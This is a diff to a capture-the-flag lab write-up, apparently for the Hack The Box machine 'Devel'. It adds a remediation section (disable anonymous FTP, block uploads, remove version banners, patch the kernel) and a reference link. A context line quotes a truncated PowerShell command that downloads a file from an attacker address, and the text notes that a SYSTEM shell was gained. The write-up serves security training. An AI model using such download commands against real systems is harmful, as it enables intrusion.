@@ -44,3 +44,18 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6
 5. Getting Admin
 - Ran the code and got shell as NT Authority/System
 
+
+6. Remediations and Best Practices
+
+- Disable anonymous access to the FTP server.
+
+- Deny File upload or the use of PUT on th FTP server if FTP is going to be used.
+
+- Remove Sensitive banners such IIS version and ASP languages.
+
+- Host should be patched and updated to latest security patches to avoid known kernel vulnerabilties
+
+
+> References
+- https://cybercoaching.medium.com/an-oscp-journey-without-using-metasploit-htb-devel-3-f7ac241ec4ba
+
